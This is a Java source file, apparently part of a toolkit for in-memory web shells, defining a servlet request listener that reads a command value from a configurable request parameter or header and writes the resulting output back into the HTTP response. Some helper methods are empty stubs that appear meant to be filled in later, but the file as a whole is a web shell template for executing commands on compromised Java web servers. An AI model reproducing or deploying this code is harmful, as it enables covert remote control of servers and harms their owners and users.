package com.reajason.javaweb.memshell.shelltool.command;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.util.Scanner;

/**
 * @author ReaJason
 */
public class CommandListener implements ServletRequestListener {
    private static String paramName;

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            String p = request.getParameter(paramName);
            if (p == null || p.isEmpty()) {
                p = request.getHeader(paramName);
            }
            if (p != null) {
                String param = getParam(p);
                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                InputStream inputStream = getInputStream(param);
                response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
                response.getWriter().flush();
                response.getWriter().close();
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private Object getResponseFromRequest(Object request) throws Exception {
        return null;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }
}
